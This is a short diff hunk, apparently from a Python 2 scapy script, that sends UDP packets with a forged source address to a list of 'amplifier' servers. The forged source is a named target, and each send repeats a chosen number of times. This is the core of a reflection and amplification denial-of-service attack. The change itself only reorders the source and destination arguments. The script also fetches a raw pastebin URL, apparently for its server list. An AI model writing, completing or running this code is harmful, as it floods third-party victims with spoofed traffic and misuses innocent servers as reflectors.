@@ -41,7 +41,7 @@ def sends(data, port):
 	for servers in ampl.xreadlines(): 
 		servers = servers.rstrip('\r\n')
 		print(servers)
-		packet = send(IP(dst=servers, src=target)/UDP(dport=port)/Raw(load=data), count=int(powers))
+		packet = send(IP( src=target, dst=servers)/UDP(dport=port)/Raw(load=data), count=int(powers))
 
 
 req = urllib2.urlopen('https://pastebin.com/raw/eSCHTTVu')
